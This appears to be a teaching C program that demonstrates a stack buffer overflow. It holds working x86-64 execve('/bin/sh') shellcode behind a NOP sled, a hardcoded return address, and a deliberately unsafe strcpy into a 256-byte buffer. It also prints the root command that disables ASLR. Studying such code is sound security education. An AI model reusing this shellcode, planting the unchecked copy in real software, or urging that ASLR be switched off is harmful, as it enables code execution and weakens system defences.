#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#undef ASSEMBLY

#if !defined(ASSEMBLY)
#define RANDOMIZE_VA_SPACE "/proc/sys/kernel/randomize_va_space"

static char my_execve[] =
	"\x90\x90\x90\x90\x90\x90\x90\x90"      /* nop, nop, nop, ...        */
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x48\x8d\x05\x3c\x11\x11\x11"          /* lea 0x1111113c(%rip),%rax */
	"\x48\x2d\x11\x11\x11\x11"              /* sub    $0x11111111,%rax   */
	"\xff\xe0"                              /* jmpq   *%rax              */
	"\x48\x31\xc0"                          /* xor    %rax,%rax          */
	"\x48\x89\x44\x24\x08"                  /* mov    %rax,0x8(%rsp)     */
	"\x48\x8b\x3c\x24"                      /* mov    (%rsp),%rdi        */
	"\x88\x47\x07"                          /* mov    %al,0x7(%rdi)      */
	"\x48\x89\xe6"                          /* mov    %rsp,%rsi          */
	"\x48\x8b\x54\x24\x08"                  /* mov    0x8(%rsp),%rdx     */
	"\xb8\x4c\x11\x11\x11"                  /* mov    $0x1111114c,%eax   */
	"\x2d\x11\x11\x11\x11"                  /* sub    $0x11111111,%eax   */
	"\x0f\x05"                              /* syscall                   */
	"\x48\x8d\x05\xd6\xff\xff\xff"          /* lea    -0x2a(%rip),%rax   */
	"\xff\xd0"                              /* callq  *%rax              */
	"\x2f\x62\x69\x6e\x2f\x73\x68"          /* .string \"/bin/sh\"       */
	"\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"      /* padding...                */
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xff\xff\xff\xff\xff\xff\xff\xff"
	"\xf0\xd3\xff\xff\xff\x7f\x00\x00"      /* (unsigned long)dst + 16*8 */
	;

static void assert_no_aslr(void)
{
	FILE *fd;
	int err = 0;
	char randomize_va_space;

	fd = fopen(RANDOMIZE_VA_SPACE, "r");
	if (!fd) {
		printf("could not open " RANDOMIZE_VA_SPACE "\n");
		exit(1);
	}

	if (fread(&randomize_va_space, sizeof(char), 1, fd) != 1) {
		printf("could not read " RANDOMIZE_VA_SPACE  "\n");
		err = 1;
	}

	fclose(fd);

	if (randomize_va_space != '0') {
		if (!err) {
			printf(RANDOMIZE_VA_SPACE ": %c\n issue (as root):\n\n"
				"    echo 0 > " RANDOMIZE_VA_SPACE "\n\n",
				randomize_va_space);
		}
		exit(1);
	}
}

static void vulnerable_func(char *src)
{
	char dst[256];

	strcpy(dst, src);
	printf("Got: %s\n", dst);
}
#endif

int main(int argc, char **argv)
{
#if defined(ASSEMBLY)
	__asm__("lea 0x1111113c(%rip),%rax");   /* load 'call' block address */
	__asm__("sub $0x11111111,%rax");        /* to $rax. Note: $rip is
	                                           that of the next op       */
	__asm__("jmp *%rax");                   /* jmp to 'call' block       */
	__asm__("xor %rax,%rax");               /* zero out $rax register    */
	__asm__("movq %rax,0x8(%rsp)");         /* terminate execve's argv
	                                           array with a NULL         */
	__asm__("mov 0x0(%rsp),%rdi");          /* set string address as
	                                           execve's 1st param        */
	__asm__("mov %al,0x7(%rdi)");           /* replace 'X' with NULL
	                                           terminator after /bin/sh  */
	__asm__("mov %rsp,%rsi");               /* set argv array address as
	                                           execve's 2nd param        */
	__asm__("mov 0x8(%rsp),%rdx");          /* set the same NULL that
	                                           terminates the argv array
	                                           as the envp NULL pointer
	                                           for execve's 3rd param    */
	__asm__("mov $0x1111114c,%eax");        /* set 0x1111114c - execve's */
	__asm__("sub $0x11111111,%eax");        /* system call id in $eax    */
	__asm__("syscall");                     /* execute the system call   */
	__asm__("lea -0x2a(%rip),%rax");        /* prepare to call back to
	                                           after the jmp instruction */
	__asm__("callq *%rax");                 /* call back to after the
	                                           jmp instruction           */
	__asm__(".string \"/bin/sh\"");         /* execution string for
	                                           execve                    */
#else
	assert_no_aslr();
	vulnerable_func(my_execve);
#endif
	return 0;
}

